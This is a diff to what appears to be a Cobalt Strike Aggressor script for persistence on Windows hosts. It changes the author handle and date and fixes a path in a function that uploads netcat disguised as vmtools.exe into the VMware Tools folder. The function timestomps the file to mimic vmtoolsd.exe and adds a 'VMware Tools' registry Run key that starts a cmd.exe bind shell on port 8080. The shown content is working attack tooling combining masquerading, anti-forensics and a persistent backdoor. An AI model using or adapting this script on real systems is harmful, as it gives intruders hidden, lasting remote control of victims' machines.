@@ -1,8 +1,8 @@
 #################################################
-# Created by @jgaudard  :: I don't twitter much
+# Created by @playswithfir3  :: I don't twitter much
 # Aggressor script for persistence
 # !!! Must create executables for upload. !!!
-# Created: 3 March 2017 Modified: 28 Mar 2017
+# Created: 3 March 2017 Modified: 25 Mar 2020
 # Version 2.1
 #
 # References: 
@@ -90,7 +90,7 @@ sub persist_runkey_netcat {
         bcd($1, 'c:\\program files\\vmware\\vmware tools');
         bupload($1, script_resource("vmtools.exe"));         ### copy /usr/share/windows-binaries/nc.exe to script directory
         btimestomp($1, "vmtools.exe", "vmtoolsd.exe");
-        bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VMware Tools" /t REG_SZ /d "C:\Program Files\Internet Explorer\vmtools.exe -lp 8080 -e cmd.exe" /f');
+        bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VMware Tools" /t REG_SZ /d "C:\Program Files\Vmware\VMware Tools\vmtools.exe -lp 8080 -e cmd.exe" /f');
     }
     else {
         berror($1, "vmtools.exe does not exist :(");
